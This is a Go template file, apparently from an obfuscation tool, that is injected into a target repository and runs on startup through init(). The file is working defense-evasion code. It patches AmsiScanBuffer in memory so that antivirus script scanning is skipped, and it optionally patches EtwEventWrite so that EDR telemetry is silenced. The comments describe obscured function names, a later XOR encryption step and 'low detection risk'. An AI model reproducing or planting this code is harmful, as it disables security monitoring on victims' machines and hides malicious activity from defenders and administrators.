// Template file for runtime evasion (Windows variant).
// This is NOT compiled — it's embedded into the obfuscation tool as a string
// and written to the target repo during -runtime phase.
// The strings here are in plaintext; the XOR obfuscation phase (which runs
// after this phase) will encrypt them. Do NOT add build tags or package
// declarations here.

package rtinit

import (
	"os"
	"syscall"
	"unsafe"
)

// _r7c2 patches the scan buffer function to return immediately.
// This blinds the scan layer — integrated AVs call this function to scan
// scripts and assemblies in memory.
// Patch: 0xB8 0x57 0x00 0x07 0x80 0xC2 0x18 0x00
// = mov eax, 0x80070057 (E_INVALIDARG) ; ret 0x18
// This makes the function always return "invalid argument" which
// causes the caller to skip the scan.
func _r7c2() {
	// Load amsi.dll — if not loaded, nothing to patch
	amsi := syscall.NewLazyDLL("amsi.dll")
	scanBuffer := amsi.NewProc("AmsiScanBuffer")
	if scanBuffer.Find() != nil {
		return
	}

	// Patch: mov eax, E_INVALIDARG ; ret 0x18
	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00}

	var oldProtect uint32
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	virtualProtect := kernel32.NewProc("VirtualProtect")

	// Make the function page writable
	virtualProtect.Call(
		scanBuffer.Addr(),
		uintptr(len(patch)),
		0x40, // PAGE_EXECUTE_READWRITE
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	// Write the patch
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(scanBuffer.Addr() + uintptr(i))) = b
	}

	// Restore original protection
	virtualProtect.Call(
		scanBuffer.Addr(),
		uintptr(len(patch)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
}

// _r3f9 patches the event write function to return immediately.
// This blinds telemetry logging (EDR products rely on it for process activity).
// Patch: 0xC3 = ret instruction (returns immediately, no event logged)
func _r3f9() {
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	etwEventWrite := ntdll.NewProc("EtwEventWrite")
	if etwEventWrite.Find() != nil {
		return
	}

	patch := []byte{0xC3}

	var oldProtect uint32
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	virtualProtect := kernel32.NewProc("VirtualProtect")

	virtualProtect.Call(
		etwEventWrite.Addr(),
		uintptr(len(patch)),
		0x40,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	*(*byte)(unsafe.Pointer(etwEventWrite.Addr())) = 0xC3

	virtualProtect.Call(
		etwEventWrite.Addr(),
		uintptr(len(patch)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
}

func init() {
	// Skip for server mode — the server runs on trusted infrastructure.
	if len(os.Args) > 1 && os.Args[1] == "serve" {
		return
	}

	// Scan bypass — always enabled (low detection risk)
	_r7c2()

	// Telemetry patch — enabled via env var (paranoid profile)
	// To enable: set PROBE_TELEMETRY_PATCH=1 in environment
	if os.Getenv("PROBE_TELEMETRY_PATCH") == "1" {
		_r3f9()
	}
}